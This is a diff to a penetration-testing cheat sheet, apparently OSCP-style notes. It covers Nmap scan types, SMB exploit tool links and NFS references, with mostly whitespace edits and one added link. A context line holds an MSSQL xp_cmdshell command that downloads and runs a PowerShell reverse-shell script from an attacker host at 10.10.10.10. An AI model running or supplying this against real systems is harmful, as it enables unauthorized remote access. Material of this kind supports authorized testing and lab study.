@@ -96,7 +96,7 @@ Nmap scan types:
     -sP, -Pn (ping sweeps) 
     -sU (UDP scan) 
     
-    -sA (TCP ACK scan - see what ports are not filtered by a firewall) 
+    -sA (TCP ACK scan - see what ports are not filtered by a firewall)        
     -sW (TCP Window / ACK scan - what ports are not filtered 
     --scanflags (custom scan)
   
@@ -207,6 +207,7 @@ Can I...
 - [ ] check for common CVEs or exploits? (See below)        
 [Eternal Blue](https://github.com/3ndG4me/AutoBlue-MS17-010) 
 [enum4linux-ng](https://github.com/cddmp/enum4linux-ng)    
+[enum4linux](https://github.com/0v3rride/Enum4LinuxPy)            
 [crackmapexec](https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatsheet/)    
 	
     SAMBA 3.x-4.x  #vulnerable to linux/samba/is_known_pipename
@@ -295,8 +296,7 @@ Get a reverse shell using xp_cmdshell (host rev.ps1 file on attack box webserver
 
     EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.10.10:8000/rev.ps1") | powershell -noprofile'   #exec PowerShell script   
 
-### TCP Port 2049: NFS 
-	
+### TCP Port 2049: NFS	
 [Pentesting NFS](https://book.hacktricks.xyz/pentesting/nfs-service-pentesting)  
 [No root squash](http://fullyautolinux.blogspot.com/2015/11/nfs-norootsquash-and-suid-basic-nfs.html)     
 nmap scripts     
